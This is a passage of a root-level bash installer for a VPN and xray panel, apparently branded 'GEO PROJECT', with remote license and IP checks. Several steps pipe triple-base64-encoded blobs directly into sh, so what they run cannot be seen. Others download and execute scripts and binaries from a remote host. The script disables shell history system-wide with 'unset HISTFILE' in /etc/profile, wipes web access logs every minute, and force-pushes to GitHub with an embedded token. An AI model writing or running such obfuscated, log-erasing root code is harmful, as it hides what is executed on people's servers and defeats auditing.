echo 'V2pJNU1HSXpRbVppUjBZd1dsaE9NRkJUU1d0TFIwNHhZMjEzWjB4WVRXZGhTRkl3WTBoTk5reDVPV2hqUjJ0MVdqSnNNR0ZJVm1sTWJVNTJZbE01ZVZwWVFuWmplVGswWlVob2VscFlTalJsU0dkMldqSTVNR0l6UVhaamJWWnpXbGRHZWxwWVRXZG1RMEp1WTIxV2QwbElVbWhhTVRsMVdWY3hiRWxJZDJkak1sWnJTVU14UmtsRFpIcE1lVFJ4U1c1WmIweHBiM0JKYVRSeFRERjNlRXg1WTJkbVEwSnZXbGRHYTBsRE1YVkpSRVZ3U1dkdlowbERRV2RhTWprd1lqTkNabUpIYkhWaGVqQnBZVWhTTUdOSVRUWk1lVGx1WVZoU2IyUlhTWFZaTWpsMFRETm9OR1ZJVG14amJtZzBaVU01Ym1JelVuWmpRemw1V2xkNGJGbFlUbXhqZVRscllqTmtkV0pIT1doYVF6a3lTa2RrZG1SSE9YZFlNbmhvWkVkV2VtUkRPVzVpTTFKMlkwWTVNa2xwVW01aU0xSjJZMFk1YzFsWVVteGpNMUZwV0RKNGNHSnVWalJZTWtaMFdrUlpNRXh0VW14WmFVbExTVU5CWjBsSFRqRmpiWGRuVEZoT1RVbERTV3RhTWprd1lqTkNabUpIYkhWaGVVbG5URmM0WjB3elVuUmpRemx1WWpOU2RtTkROV3RhVjBsTFNVTkJaMGxIVW5kaE1tTm5URmRyWjB3elVuUmpRemx1WWpOU2RtTkROV3RhVjBsblVHazVhMXBZV1haaWJsWnpZa05CZVZCcFdYaERhVUZuU1VOQlMwbERRV2RKUTBGblNVTkJha2xFTkdkUmJsWm9aRU5DZW1ReVJuZEpTRTVzV1cxV2VsbFlTV2ROVldOTFNVTkJaMGxIVW10SlIyeHRVRk01YTFwWVdYWmxiVlo1WW5sQ2RscHFNSFpqTTJSb1kwZGFjR0pIVldkWmJrMDVUVlJCZVU1RFFtcGlNMVoxWkVRd2VFMUVVVFJPVkdNeVEybEJaMGxEUW5SaE0wNHpXVmhCWjB3elRqTlpXRUp0WVZkNGJFTnBRV2RKUTBKcVlVYzVNMkpwUW5saU1qa3dUMjVLZG1JelVXZE1NMDR6V1ZoQ2JXRlhlR3hEYVVGblNVTkNhbUZITVhaYVEwRjNUbXBCZDBsRE9YcGtNa1ozV20xc2MxcFRRU3RNTWxKc1pHazVkV1JYZUhOSlJFa3JTbXBGUzBsRFFXZEpTRTR6V1ZoQ2RtSnBRWFpqTTJSb1kwZGFjR0pIVldkUWFUbHJXbGhaZG1KdVZuTmlRMEY1VUdsWmVFTnBRV2RKUTBKNldsZFJaMHhYYTJkS2VWRm5ZVlozZG1NelpHaGpSMXB3WWtkVlowbERRV2RKUTBKNlpESkdkMGxJVGpOWldFRm5TVU5DYTFwWFdtaGtWM2d3WTNsQlowbERRWGRKUkVGdVNVTTViR1JIVFhaYWJrNHdXVmRKUzBOcFFXZEpRMEZxU1VRMFoxVXliSFZhTW5SNVlqSTFjR015Um5waFUwSnhXVmN3UzBsRFFXZEpSMDV2WTIwNWRXVlhVV2RNV0VWblNqTk9iR051V214amFVRjNURzFzYTB4dVFuWmlNbmQxWW01U2QweHRPWGxhZVVKd1dXNVdlV016VVc1RGFVRm5TVU5DYW1GSVNuWmlibXhxU1VoT2RtUllTbXBhV0U0d1dWaFNla2xETVRKRGFVRm5TVU5DYW1GSVNuWmlibXhxU1VoU2VWbFhUbkpoVnpWdVNVTXhNa05wUVdkSlEwSnNXVEpvZGtsRFNXaz0=' | base64 -d | base64 -d | base64 -d | sh
print_success "SWAP 1 G"
}
function ins_bbr(){
clear
print_install "MEMASANG BBR"
echo 'WkRKa2JHUkRRV3RsTUdSR1ZERTVWMVZGTlRsWmJVcDVURzVPYjBsRFdXMUpRMEpxWVVjeGRscERRWEpsUTBKcFdXNUpkV015WjJkS2FWbG5UR2s1YVZsdVNYVmpNbWRMU1VOQlowbEhWbXBoUnpoblNXbEpQUT09' | base64 -d | base64 -d | base64 -d | sh
print_success "BBR"
}
clear
function limit_xray(){
clear
print_install "MEMASANG LIMIT XRAY"
wget ${GEO_VPN}limit/limit.sh &&  chmod +x limit.sh && ./limit.sh

AUTOREB=$(cat /home/daily_reboot)
SETT=11
if [ $AUTOREB -gt $SETT ]; then
TIME_DATE="PM"
else
TIME_DATE="AM"
fi
print_success "LIMIT XRAY"
}
function ins_epro(){
clear
print_install "MENGINSTALL EPRO WEBSOCKET PROXY"
wget -O /usr/bin/ws "${GEO_VPN}ws/ws" >/dev/null 2>&1
    wget -O /usr/bin/tun.conf "${GEO_VPN}ws/tun.conf" >/dev/null 2>&1
    wget -O /etc/systemd/system/ws.service "${GEO_VPN}ws/ws.service" >/dev/null 2>&1
    wget -q -O /etc/ipserver "${GEO_VPN}ssh/ipserver" && bash /etc/ipserver >/dev/null 2>&1
    chmod +x /etc/systemd/system/ws.service
    chmod +x /usr/bin/ws
    chmod 644 /usr/bin/tun.conf
    systemctl disable ws
    systemctl stop ws
    systemctl enable ws
    systemctl start ws
    systemctl restart ws
#wget -q -O /usr/local/share/xray/geosite.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat" >/dev/null 2>&1
#wget -q -O /usr/local/share/xray/geoip.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geoip.dat" >/dev/null 2>&1
wget -O /usr/sbin/GeoProject "${GEO_VPN}ws/GeoProject" >/dev/null 2>&1
chmod +x /usr/sbin/GeoProject
iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP
iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP
iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j DROP
iptables -A FORWARD -m string --algo bm --string "peer_id=" -j DROP
iptables -A FORWARD -m string --algo bm --string ".torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j DROP
iptables -A FORWARD -m string --algo bm --string "torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce" -j DROP
iptables -A FORWARD -m string --algo bm --string "info_hash" -j DROP
iptables-save > /etc/iptables.up.rules
iptables-restore -t < /etc/iptables.up.rules
netfilter-persistent save
netfilter-persistent reload
cd
echo 'V1ZoQ01FbEhSakZrUnpscVlrZFdhR0pwUVhSbFUwRXJUREpTYkdScE9YVmtWM2h6U1VSSkswcHFSVXRaV0VJd1NVZEdNV1JIT1hsYVZ6RjJaRzFWWjB4WWEyZFFhVGxyV2xoWmRtSnVWbk5pUTBGNVVHbFplQT09' | base64 -d | base64 -d | base64 -d | sh
echo -e ""
print_success "EPRO WEBSOCKET PROXY"
}
function ins_restart(){
clear
print_install "RESTARTING  ALL PACKET"
echo 'U1VOQlowbElUalZqTTFKc1lsZE9NR0pEUW14aWJVWnBZa2RWWjB4VE1YVmlNMk5uWW0xa2NHSnVaMHRKUTBGblNVaE9OV016VW14aVYwNHdZa05DYkdKdFJtbGlSMVZuVEZNeGRXSXpZMmRsU0Vwb1pWRnZaMGxEUVdkak0yeDZaRWRXZEZrelVuTkpSMVoxV1ZkS2MxcFRRWFJNVnpWMlpIbENlVmw1TVhOaU1rNW9Za0Z2WjBsRFFXZGpNMng2WkVkV2RGa3pVbk5KUjFaMVdWZEtjMXBUUVhSTVZ6VjJaSGxDZG1OSFZuVmtia0oxUTJsQlowbERRbnBsV0U0d1dsY3hhbVJIZDJkYVZ6Vm9XVzE0YkVsRE1IUmliVGt6U1VkT2VXSXlORXRKUTBGblNVaE9OV016VW14aVYwNHdZa05DYkdKdFJtbGlSMVZuVEZNeGRXSXpZMmRoUjBaM1kyMDVOR1ZSYjJkSlEwRm5Zek5zZW1SSFZuUlpNMUp6U1VkV2RWbFhTbk5hVTBGMFRGYzFkbVI1UW5WYVdGSnRZVmQ0TUZwWVNYUmpSMVo1WXpKc2VtUkhWblZrUVc5blNVTkJaMk16Ykhwa1IxWjBXVE5TYzBsSFZuVlpWMHB6V2xOQmRFeFhOWFprZVVJelkzZHZaMGxEUVdkak0yeDZaRWRXZEZrelVuTkpSMVoxV1ZkS2MxcFRRWFJNVnpWMlpIbENiVmxYYkhOTmJVcG9ZbWR2WjBsRFFXZGpNMng2WkVkV2RGa3pVbk5KUjFaMVdWZEtjMXBUUVhSTVZ6VjJaSGxDZVZsNU1YTmlNazVvWWtGdlowbERRV2RqTTJ4NlpFZFdkRmt6VW5OSlIxWjFXVmRLYzFwVFFYUk1WelYyWkhsQ2FtTnRPWFZEYVVGblNVTkNlbVZZVGpCYVZ6RnFaRWQzWjFwWE5XaFpiWGhzU1VkT2IyTnRPWFZsVVc5blNVTkJaMk16Ykhwa1IxWjBXVE5TYzBsSFZuVlpWMHB6V2xOQmRFeFhOWFprZVVKMVdsaFNiV0ZYZURCYVdFbDBZMGRXZVdNeWJIcGtSMVoxWkVGdlowbERRV2RqTTJ4NlpFZFdkRmt6VW5OSlIxWjFXVmRLYzFwVFFtcGlSMnhzWW01UlMwbERRV2RKU0U0MVl6TlNiR0pYVGpCaVEwSnNZbTFHYVdKSFZXZGpNbFo1WkcxV2VVTnBRV2RKUTBKNlpWaE9NRnBYTVdwa1IzZG5Zek5TYUdOdVVXZFpNbmh3V2xjMU1FTnBRV2RKUTBKNlpWaE9NRnBYTVdwa1IzZG5Zek5TYUdOdVVXZGpNbFo1WkcxV2VVTnBRV2RKUTBKNlpWaE9NRnBYTVdwa1IzZG5ZMjFXZW1SSFJubGtRMEpxWWtkc2JHSnVVVXRKUTBGblNVaE9OV016VW14aVYwNHdZa05DZVZwWVRqQlpXRW93U1VoT2JHTnVXbXhqWjI5blNVTkJaMGxET1d4a1IwMTJZVmMxY0dSRE5XdE1NalZ1WVZjMU5FbElTbXhqTTFKb1kyNVJTMGxEUVdkSlEwRjJXbGhTYWt3eWJIVmhXRkYxV2tNNWRtTkhWblZrYmtKMVNVaEtiR016VW1oamJsRkxTVU5CWjBsRE9XeGtSMDEyWVZjMWNHUkROV3RNTTA1NllVTkNlVnBZVGpCWldFb3dRMmxCWjBsRFFYWmFXRkpxVERKc2RXRllVWFZhUXpsclkyMDVkMWx0Vm1oamFVSjVXbGhPTUZsWVNqQkRhVUZuU1VOQmRscFlVbXBNTW14MVlWaFJkVnBET1cxWlYyeHpUVzFLYUdKcFFubGFXRTR3V1ZoS01FTnBRV2RKUTBGMldsaFNha3d5YkhWaFdGRjFXa001TW1KdVRqQlpXRkZuWTIxV2VtUkhSbmxrUVc5blNVTkJaMHd5VmpCWmVUbHdZbTFzTUV4dFVYWlpNMHAyWW1sQ2VWcFlUakJaV0Vvd1EybEJaMGxEUW5wbFdFNHdXbGN4YW1SSGQyZGpiVlo2WkVkR2VXUkRRbTlaV0VKNVlqTm9OVU5wUVdkSlEwSjZaVmhPTUZwWE1XcGtSM2RuV2tkR2JHSlhPWFZNV0Vwc1lrYzVhRnBCYjJkSlEwRm5Zek5zZW1SSFZuUlpNMUp6U1VoS2JHTXpVbWhqYmxGbldUSm9lV0l5TlRWYVFXOW5TVU5CWjJNemJIcGtSMVowV1ROU2MwbElTbXhqTTFKb1kyNVJaMWt5YUhsaU1qVTFRMmxCWjBsRFFucGxXRTR3V2xjeGFtUkhkMmRhUjBac1lsYzVkVXhZU214aVJ6bG9Xa0Z2WjBsRFFXZGpNMng2WkVkV2RGa3pVbk5KU0U0d1dWaEtNRWxITld4a1IxcHdZa2hTYkdOcE1YZGFXRXA2WVZoT01GcFhOVEJEYVVGblNVTkNlbVZZVGpCYVZ6RnFaRWQzWjJOdFZucGtSMFo1WkVOQ2RWb3liSFZsUVc5blNVTkJaMk16Ykhwa1IxWjBXVE5TYzBsSVNteGpNMUpvWTI1UloyVklTbWhsVVc5blNVTkJaMk16Ykhwa1IxWjBXVE5TYzBsSVNteGpNMUpvWTI1Uloxa3pTblppWjI5blNVTkJaMk16Ykhwa1IxWjBXVE5TYzBsSVRqQlpXRW93U1VjMWJHUkhXbkJpU0ZKc1kya3hkMXBZU25waFdFNHdXbGMxTUE9PQ==' | base64 -d | base64 -d | base64 -d | sh
sudo hostnamectl set-hostname $Nama_Issued_License
echo "unset HISTFILE" >> /etc/profile
cd
rm -f /root/openvpn
rm -f /root/key.pem
rm -f /root/cert.pem
echo -e ""
print_success "ALL PACKET"
clear
}
function menu(){
clear
print_install "MEMASANG MENU PACKET"
echo 'WkRKa2JHUkRRWFJVZVVJclRESXhiR0p1VlhWbGJXeDNTVU5KYTJVd1pFWlVNVGxYVlVVMU9XTXpUbTlNTWpGc1ltNVZkV1Z0YkhkSmFVRXJUREpTYkdScE9YVmtWM2h6U1VSSkswcHFSVXRKUTBGblNVY3hjbHBIYkhsSlF6bDVZakk1TUV3eU1XeGlibFZMU1VOQlowbEVaRFpKUjFWblRGaENlbVJYTVdsWldHUm9TVU5CWjJacE9YUmFWelV4VEc1d2NHTkRRWFJpZVRsNVlqSTVNRXd5TVd4aWJsVjJTVVEwZGxwSFZqSk1NalV4WWtkM1owMXFORzFOVVc5blNVTkJaMWt5YUhSaU1sRm5Tek5uWjB3elNuWmlNMUYyWWxkV2RXUlRPSEZEYVVGblNVTkNkR1JwUVhaamJUbDJaRU01ZEZwWE5URk1lVzluVEROV2VtTnBPWE5pTWs1b1lrTTVlbGx0YkhWTWQyOW5TVU5CWjFsdWNHeGxSMVZuVEROV2VtTnBPWE5pTWs1b1lrTTVlbGx0YkhWTWVXOW5TbWxaWjJOdE1HZE1NMVo2WTJrNWMySXlUbWhpUXpsNldXMXNkVXg1Y0N0RGFVRm5TVU5DYkZreWFIWkpRMGxw' | base64 -d | base64 -d | base64 -d | sh
print_success "MENU PACKET"
}
function ins_rclone(){
clear
print_install "MEMASANG RCLONE"
wget -q -O /root/ins-rclone.sh "${GEO_VPN}backup/ins-rclone.sh"
    chmod +x /root/ins-rclone.sh
    ./ins-rclone.sh
    echo ""
print_success "RCLONE"
}
function ins_izin(){
clear
rm -r -f /root/perizinan
git clone https://${TOKEN}@github.com/${USER}/perizinan.git &> /dev/null
export Licc="$( cat /etc/${Auther}/license.key | awk '{print $1}' )"
export Nam=$( curl -s https://${Server_URLL}/registered.txt | grep -w $Licc | cut -d ' ' -f 9-100 | tr -d '\r' | tr -d '\r\n')
export lim=$( curl -s https://${Server_URLL}/registered.txt | grep $License_Key | cut -d ' ' -f 2 )
if [[ $lim == 'Unlimited' ]]; then
echo ""
else
Lic=$( cat /etc/${Auther}/license.key | awk '{print $1}' )
limit=$( curl -s https://${Server_URLL}/registered.txt | grep -w $Lic | cut -d ' ' -f 2 | tr -d '\r' | tr -d '\r\n')
start=$( curl -s https://${Server_URLL}/registered.txt | grep -w $Lic | cut -d ' ' -f 3 | tr -d '\r' | tr -d '\r\n')
exp=$( curl -s https://${Server_URLL}/registered.txt | grep -w $Lic | cut -d ' ' -f 4 | tr -d '\r' | tr -d '\r\n')
ah=$( curl -s https://${Server_URLL}/registered.txt | grep -w $Lic | cut -d ' ' -f 5 | tr -d '\r' | tr -d '\r\n')
ahh=$( curl -s https://${Server_URLL}/registered.txt | grep -w $Lic | cut -d ' ' -f 6 | tr -d '\r' | tr -d '\r\n')
ahhh=$( curl -s https://${Server_URLL}/registered.txt | grep -w $Lic | cut -d ' ' -f 7 | tr -d '\r' | tr -d '\r\n')
tipe=$( curl -s https://${Server_URLL}/registered.txt | grep -w $Lic | cut -d ' ' -f 8 | tr -d '\r' | tr -d '\r\n')
nama=$( curl -s https://${Server_URLL}/registered.txt | grep -w $Lic | cut -d ' ' -f 9-100 | tr -d '\r' | tr -d '\r\n')
export Tanggal_Sekarang=`date -d "0 days" +"%Y-%m-%d"`
export Masa_Aktif_Dalam_Satuan_Detik=$(date -d "$exp" +%s)
export Tanggal_Sekarang_Dalam_Satuan_Detik=$(date -d "$Tanggal_Sekarang" +%s)
export Hasil_Pengurangan_Dari_Masa_Aktif_Dan_Hari_Ini_Dalam_Satuan_Detik=$(( (Masa_Aktif_Dalam_Satuan_Detik - Tanggal_Sekarang_Dalam_Satuan_Detik) / 86400 ))
d1=${limit}
d2=1
expp=$((limit-d2))
sed -i "s/${Lic} ${limit} ${start} ${exp} ${ah} ${ahh} ${ahhh} ${tipe} ${nama}/${Lic} ${expp} ${start} ${exp} ${ah} ${ahh} ${ahhh} ${tipe} ${nama}/g" /root/perizinan/registered.txt &> /dev/null
fi
touch /etc/${Auther}/license.key
export Your_Lice="$( cat /etc/${Auther}/license.key | awk '{print $1}' )"
export Validated_Your_License_Key_With_Server="$( curl -s https://${Server_URLL}/limit/ip | grep -w $IP | head -n1 | cut -d ' ' -f 1 )"
if [[ "$Validated_Your_License_Key_With_Server" == "$IP" ]]; then
validated='true'
echo -e "\033[0;34m╭══════════════════════════════════════════════════╮${NC}"
echo -e "\033[0;34m│$NC$L1\033[41m                   INSTALLING                     $NC\033[0;34m│$NC"
echo -e "\033[0;34m╰══════════════════════════════════════════════════╯${NC}"
echo -e ""
elif [[ $lim == 'Unlimited' ]]; then
echo -e ""
masaaktif=999999
hariini=`date -d "0 days" +"%Y-%m-%d"`
expp=`date -d "$masaaktif days" +"%Y-%m-%d"`
echo "$IP $hariini $expp" >> /root/perizinan/limit/ip
git config --global user.email "${EMAIL}" &> /dev/null
git config --global user.name "${USER}" &> /dev/null
rm -rf .git &> /dev/null
cd /root/perizinan > /dev/null 2>&1
git init &> /dev/null
git add . &> /dev/null
git commit -m . &> /dev/null
git branch -M main &> /dev/null
git remote add origin https://github.com/${USER}/perizinan.git &> /dev/null
git push -f https://${TOKEN}@github.com/${USER}/perizinan.git &> /dev/null
cd
rm -r -f /root/perizinan > /dev/null 2>&1
else
clear
sleep 2
echo -e "\033[0;34m╭══════════════════════════════════════════════════╮${NC}"
echo -e "\033[0;34m│$NC$L1\033[41m                   REGISTERING IP                 $NC\033[0;34m│$NC"
echo -e "\033[0;34m╰══════════════════════════════════════════════════╯${NC}"
masaaktif=999999
hariini=`date -d "0 days" +"%Y-%m-%d"`
expp=`date -d "$masaaktif days" +"%Y-%m-%d"`
echo "$IP $hariini $expp" >> /root/perizinan/limit/ip
git config --global user.email "${EMAIL}" &> /dev/null
git config --global user.name "${USER}" &> /dev/null
rm -rf .git &> /dev/null
cd /root/perizinan > /dev/null 2>&1
git init &> /dev/null
git add . &> /dev/null
git commit -m . &> /dev/null
git branch -M main &> /dev/null
git remote add origin https://github.com/${USER}/perizinan.git &> /dev/null
git push -f https://${TOKEN}@github.com/${USER}/perizinan.git &> /dev/null
cd
rm -r -f /root/perizinan > /dev/null 2>&1
fi
}
function profile(){
clear
cat >/root/.profile <<EOF
if [ "$BASH" ]; then
if [ -f ~/.bashrc ]; then
. ~/.bashrc
fi
fi
mesg n || true
menu
EOF
cat >/etc/cron.d/xp_all <<EOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
2 0 * * * root /usr/local/sbin/xp
EOF
cat >/etc/cron.d/x_limp <<EOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/10 * * * * root /usr/local/sbin/xraylimit
EOF
chmod 644 /root/.profile
cat >/etc/cron.d/daily_reboot <<EOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 5 * * * root /sbin/reboot
EOF
echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >>/etc/cron.d/log.xray
service cron restart
cat >/home/daily_reboot <<EOF
5
EOF
echo "/bin/false" >>/etc/shells
echo "/usr/sbin/nologin" >>/etc/shells
}
export NETWORK_IFACE="$(ip route show to default | awk '{print $5}')"
echo 'V1ZoQ01FbElWbmRhUjBZd1dsTkJkR1ZUUVN0SlF6bHJXbGhaZG1KdVZuTmlRMEY1VUdsWmVFTnRSbmRrUTBJeFkwZGtlVmxYVW14SlF6RTFTVVEwWjB3eVVteGthVGwxWkZkNGMwbEVTU3RLYWtWTFdWaENNRWxIUmpGa1J6bDVXbGN4ZG1SdFZXZE1XR3RuVUdsQmRscEhWakpNTWpVeFlrZDNaMDFxTkcxTlVYQm9ZMGhSWjJGWE5YcGtSMFp6WWtOQ2JtRllVV2RNV0d0blVHbEJkbHBIVmpKTU1qVXhZa2QzWjAxcU5HMU5VWEJxWWtkV2FHTm5QVDA9' | base64 -d | base64 -d | base64 -d | sh
clear
if ! which wget > /dev/null; then
echo ""
echo -e "${EROR} Wget Packages Not Installed !"
echo ""
read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Install The Packages") "
apt install wget -y > /dev/null 2>&1
fi
clear
if ! which curl > /dev/null; then
echo ""
echo -e "${EROR} Curl Packages Not Installed !"
echo ""
read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Install The Packages") "
apt install curl -y > /dev/null 2>&1
fi
export IP=$( curl -s ifconfig.me )
clear
clear && clear && clear
clear;clear;clear
echo 'V2xkT2IySjVRV2xLU0hSYVVsVjRUVlF4WkRsTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk5TTjFSclRqbEpaM0JzV1RKb2RrbERTV2RKUm1Sc1lrZE9kbUpYVldkV1J6aG5VakpXZGtsR1FubGlNbkJzV1ROUloxVXlUbmxoV0VJd1NVVnNkV016VW1oaVIzaHNZMmxCYTJVeGJFWlVSWGhRVmpNd2IwcElkRTlSTXpCclpUQmtVMUpWVms5bVUwSlVaRWRHYVdKSFZXZFNWMUp3WkVkc2RtSnBRV3RsTURWRVpsTlNOMWRWVmsxVVJUbFlabE5yYTJVd05VUm1VMGxMV2xkT2IySjVRV2xKUTBGblNVTkNWV0ZIYkhwSlJtUndZa2QzWjFWWVZuQlpNbk5uVlRKV01HUllRV2RXYkVKUFNVWk9iR051V214amFVSlFZbWxDV21JelZubEpSazVzWTI1YWJHTnBTVXRhVjA1dllubEJhVWxEUVdkSlEwRm5TVU5CWjFGWVZqQmhSMVo1U1VSdlowcElkRWhWYTFaR1ZHNHhUbFpWYUVKVVZURkNVa05DUWxSVmJFOUpRMUkzVkd0T09VcElkRnBTVlhoTlZERmtPVXREVWpkVWEwNDVTVU5TTjFJeFNrWlNWVFU1VWpKV2RrbEdRbmxpTW5Cc1dUTlJaMHBJZEU5Uk16QnJaVEZzUmxSRmVGQldNekJ3U2toMFQxRXpNR2xEYlZacVlVYzRaMGxwUVdkSlEwRm5TVU5FUTNGVFFsTmFWekYyV2tkVloxRnVhMmRTTWxaMlNVWkNlV0l5Y0d4Wk0xRm5Ta2gwV2xKVmVFMVVNV1E1UzBOU04xUnJUamxKUkVsM1RXcFJaMHBJZEZwU1ZYaE5WREZrT1V0VFVqZFVhMDQ1U1dkd2JGa3lhSFpKUTBsclpURnNSbFJGZUZCV016QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEVwSWRFOVJNekJwUTIxV2FtRkhPR2RKYVVrOQ==' | base64 -d | base64 -d | base64 -d | sh
if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
echo -e "${OKEY} Your Architecture Is Supported ( ${GREEN}$( uname -m )${NC} )"
else
echo -e "${EROR} Your Architecture Is Not Supported ( ${YELLOW}$( uname -m )${NC} )"
exit 1
fi
if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
echo -e "${OKEY} Your OS Is Supported ( ${GREEN}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
echo -e "${OKEY} Your OS Is Supported ( ${GREEN}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
else
echo -e "${EROR} Your OS Is Not Supported ( ${YELLOW}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
exit 1
fi
if [[ $( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | cut -d ' ' -f 2 ) == "22.04.1" ]]; then
echo -e "${OKEY} Your OS Is Not Supported ( ${GREEN}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
exit 1
elif [[ $( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | cut -d ' ' -f 2 ) == "11" ]]; then
echo -e "${OKEY} Your OS Is Not Supported ( ${GREEN}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
exit 1
else
Skip="True"
fi
if [[ $IP == "" ]]; then
echo -e "${EROR} IP Address ( ${YELLOW}Not Detected${NC} )"
else
echo -e "${OKEY} IP Address ( ${GREEN}$IP${NC} )"
fi
echo ""
read -p "Input Your License Key : " Input_License_Key
if [[ $Input_License_Key ==  "" ]]; then
echo -e "${EROR} Please Input License Key !${NC}"
exit 1
fi
Key="$Input_License_Key"
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
algoritmakeys="${MANGAP}"
hashsuccess="$(echo -n "$Key" | sha256sum | cut -d ' ' -f 1)"
Sha256Successs="$(echo -n "$hashsuccess$algoritmakeys" | sha256sum | cut -d ' ' -f 1)"
License_Key=$Sha256Successs
echo ""
#>>>GEO PROJECT
 pass='number1 number12 number13 number14 number15 number16'
 chk='number14'
 for i in $pass ; do > /dev/null 2>&1
 if [ "$i" == "$chk" ]; then> /dev/null 2>&1
 echo ' Found ^_^'> /dev/null 2>&1
 else
 echo 'loading 50%'> /dev/null 2>&1
 fi
 done
 for i in $(seq 1 100)
do
    sleep 0.05
    echo $i
done | whiptail --title 'SCRIPT MOD By GEO PROJECT' --gauge '   PLEASE WAIT CECKING LICENCE KEY...' 8 55 0
clear
sleep 1
Getting_Data_On_Server=$( curl -s https://${Server_URLL}/registered.txt | grep $License_Key | cut -d ' ' -f 1 )
if [[ "$Getting_Data_On_Server" == "$License_Key" ]]; then
mkdir -p /etc/${Auther}/
echo "$License_Key" > /etc/${Auther}/license.key
echo -e "${OKEY} License Validated !"
sleep 2
else
echo -e "${EROR} Your License Key Not Valid !"
exit 1
fi
clear
SAMAWA
echo -e ""
if [[ $IP == "" ]]; then
echo -e "${EROR} Your IP Address Not Detected !"
exit 1
else
export Check_Blacklist_Atau_Tidak=$( curl -s https://${Server_URLL}/blokir.txt | grep -w $IP | awk '{print $1}' | tr -d '\r' | tr -d '\r\n' | head -n1 )
if [[ $Check_Blacklist_Atau_Tidak == $IP ]]; then
echo -e "${EROR} 403 Forbidden ( Your VPS Has Been Blocked ) !"
exit 1
else
Skip='true'
fi
fi
export Tanggal_Pembelian_License=$( curl -s https://${Server_URLL}/registered.txt | grep -w $License_Key | cut -d ' ' -f 3 | tr -d '\r' | tr -d '\r\n')
export Nama_Issued_License=$( curl -s https://${Server_URLL}/registered.txt | grep -w $License_Key | cut -d ' ' -f 9-100 | tr -d '\r' | tr -d '\r\n')
export Masa_Laku_License_Berlaku_Sampai=$( curl -s https://${Server_URLL}/registered.txt | grep -w $License_Key | cut -d ' ' -f 4 | tr -d '\r' | tr -d '\r\n')
export Install_Limit=$( curl -s https://${Server_URLL}/registered.txt | grep -w $License_Key | cut -d ' ' -f 2 | tr -d '\r' | tr -d '\r\n')
export Tipe_License=$( curl -s https://${Server_URLL}/registered.txt | grep -w $License_Key | cut -d ' ' -f 8 | tr -d '\r' | tr -d '\r\n')
echo -e "${OKEY} IP Address ( ${GREEN}$IP${NC} )"
echo -e "${OKEY} This License Issued to (${GREEN} $Nama_Issued_License ${NC})"
echo -e "${OKEY} Subscription Started On (${GREEN} $Tanggal_Pembelian_License${NC} )"
echo -e "${OKEY} Subscription Ended On ( ${GREEN}${Masa_Laku_License_Berlaku_Sampai}${NC} )"
if [[ $( curl -s https://${Server_URLL}/limit/ip | grep -w $IP | cut -d ' ' -f 1) == "$IP" ]]; then
echo -e "${OKEY} Installation Limit ( ${GREEN}$Install_Limit VPS${NC} )"
echo -e "${OKEY} YOUR IP IS REGISTERED TRY RENNEW INSTALLING${NC}"
elif [[ $Install_Limit == '0' ]]; then
echo -e "${EROR} Your Has Reached Limit ( ${RED}$Install_Limit${NC} ${GREEN}VPS${NC} )"
echo -e "${EROR} Installation Limit ( ${RED}$Install_Limit VPS${NC} )"
exit 1
else
echo -e "${OKEY} Installation Limit ( ${GREEN}$Install_Limit VPS${NC} )"
fi
export Tanggal_Sekarang=`date -d "0 days" +"%Y-%m-%d"`
export Masa_Aktif_Dalam_Satuan_Detik=$(date -d "$Masa_Laku_License_Berlaku_Sampai" +%s)
export Tanggal_Sekarang_Dalam_Satuan_Detik=$(date -d "$Tanggal_Sekarang" +%s)
